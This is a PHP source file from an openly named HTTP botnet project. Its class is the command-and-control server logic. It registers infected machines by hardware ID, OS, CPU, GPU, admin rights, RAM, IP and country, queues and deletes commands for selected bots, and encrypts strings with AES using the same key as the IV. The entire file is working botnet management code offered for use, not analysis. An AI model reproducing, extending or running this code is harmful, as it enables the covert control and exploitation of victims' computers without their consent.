<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

class heartbeat
{
    public $pdo;

    public function __construct()
    {
        $this->pdo = new \PDO('mysql:host='.goat::$app->config['db']['host'].';dbname='.goat::$app->config['db']['dbname'], goat::$app->config['db']['username'], goat::$app->config['db']['password']);
    }

    public function beat($data = [])
    {
        if (isset($data) && ! empty($data)) {
            //{bbed3e02-0b41-11e3-8249-806e6f6e6963}@Microsoft Windows 8 x64 Edition@Intel(R) Core(TM) i7-5950HQ CPU @ 2.90GHz@NVIDIA GeForce GTX 980M   NVIDIA GeForce GTX 980M   @v4.0@false@25165824 @ip @countryname @countrycode
            //ON DUPLICATE KEY UPDATE
            date_default_timezone_set('America/New_York');
            $p = [];
            $p[':hwid'] = $data[0];

            $p[':c'] = $data[9];
            $p[':cc'] = $data[10];
            $p[':ip'] = $data[8];
            $p[':os'] = $data[1];
            $p[':cpu'] = $data[2].$data[3];
            $p[':gpu'] = $data[4];
            $p[':net'] = $data[5];
            $p[':adm'] = $data[6];
            $p[':ram'] = $data[7];
            $p[':ls'] = date('Y-m-d H:i:s'); //date("h:i:sa");

            $result = $this->pdo->prepare('INSERT INTO `bots` (`hwid`, `country`, `country_code`, `ip`, `os`, `cpu`, `gpu`, `net`, `admin`, `ram`, `lastseen` ) VALUES (:hwid, :c, :cc, :ip, :os, :cpu, :gpu, :net, :adm, :ram, :ls) ON DUPLICATE KEY UPDATE `country` = VALUES(country), `country_code` = VALUES(country_code), `ip` = VALUES(ip), `os` = VALUES(os), `cpu` = VALUES(cpu), `gpu` = VALUES(gpu), `net` = VALUES(net), `admin` = VALUES(admin), `ram` = VALUES(ram), `lastseen` = VALUES(lastseen)');
            $result->execute($p);

            $id = $this->pdo->lastInsertId();

            if (! is_numeric($id) || ! isset($id)) {
                $p = [];
                $p[':hwid'] = $data[0];
                $result = $this->pdo->prepare('SELECT id FROM bots WHERE hwid = :hwid');
                $result->execute($p);
                $values = $result->fetchAll();
                if (0 == count($values)) {
                    $id = -1;
                } else {
                    $id = $values[0][0];
                }
            }

            return $id;
        }
    }

    public function splitToArray($data)
    {
        $newData = explode('@', $data);
        $out = [];
        foreach ($newData as $item) {
            array_push($out, $item);
        }

        return $out;
    }

    public function delete_command($id)
    {
        try {
            $p = [];
            $p[':id'] = $id;
            $statement = $this->pdo->prepare('DELETE FROM `botcommands` WHERE `botid` = :id AND `result` IS NULL');
            $statement->execute($p);
        } catch (PDOException $e) {
            return $e;
        }

        return true;
    }

    public function create_command($params = []) //$commandId, $params, $bots = [], $pdo
    {
        foreach ($params['bots'] as $bot) {
            try {
                $p = [];
                $p[':cid'] = $params['commandId'];
                $p[':params'] = $params['params'];
                $statement = $this->pdo->prepare('INSERT INTO `commands` (`commandtype`, `commandString`) VALUES(:cid, :params)');
                $statement->execute($p);

                $p = [];
                $p[':cid'] = $this->pdo->lastInsertId();
                $p[':bid'] = $bot;

                $statement = $this->pdo->prepare('INSERT INTO `botcommands` (`botId`, `commandId`) VALUES(:bid, :cid)');
                $statement->execute($p);
            } catch (PDOException $e) {
                return $e;
            }
        }

        return true;
    }

    public function log_aes($action, $string)
    {
        $output = false;

        $encrypt_method = 'AES-256-CBC';
        $secret_key = goat::$app->config['key'];
        $secret_iv = goat::$app->config['key'];

        // hash
        $key = hash('sha256', $secret_key);

        // iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
        $iv = substr(hash('sha256', $secret_iv), 0, 16);

        if ('encrypt' == $action) {
            $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
            $output = base64_encode($output);
        } elseif ('decrypt' == $action) {
            $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
        }

        return $output;
    }
}
